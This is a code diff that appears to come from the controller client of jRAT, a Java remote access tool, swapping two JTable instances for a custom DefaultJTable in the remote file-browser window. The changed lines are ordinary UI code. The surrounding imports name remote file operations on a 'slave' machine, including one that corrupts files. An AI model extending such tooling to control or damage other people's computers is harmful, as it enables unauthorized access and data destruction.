@@ -61,6 +61,7 @@ import se.jrat.client.packets.outgoing.Packet47RenameFile;
 import se.jrat.client.packets.outgoing.Packet64FileHash;
 import se.jrat.client.packets.outgoing.Packet70CorruptFile;
 import se.jrat.client.settings.FileBookmarks;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.renderers.table.FileViewTableRenderer;
 import se.jrat.client.utils.IconUtils;
 import se.jrat.client.utils.Utils;
@@ -426,7 +427,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 		JScrollPane scrollPane = new JScrollPane();
 		splitPane.setRightComponent(scrollPane);
-		table = new JTable(model);
+		table = new DefaultJTable(model);
 		table.setDefaultRenderer(Object.class, renderer = new FileViewTableRenderer(slave));
 		table.addMouseListener(new MouseAdapter() {
 			@Override
@@ -772,7 +773,7 @@ public class FrameRemoteFiles extends BaseFrame {
 
 		JScrollPane scrollPaneme = new JScrollPane();
 		splitPane.setLeftComponent(scrollPaneme);
-		tableme = new JTable(modelme);
+		tableme = new DefaultJTable(modelme);
 		tableme.setDefaultRenderer(Object.class, rendererme = new FileViewTableRenderer(slave));
 		tableme.getTableHeader().setReorderingAllowed(false);
 		tableme.addMouseListener(new MouseAdapter() {
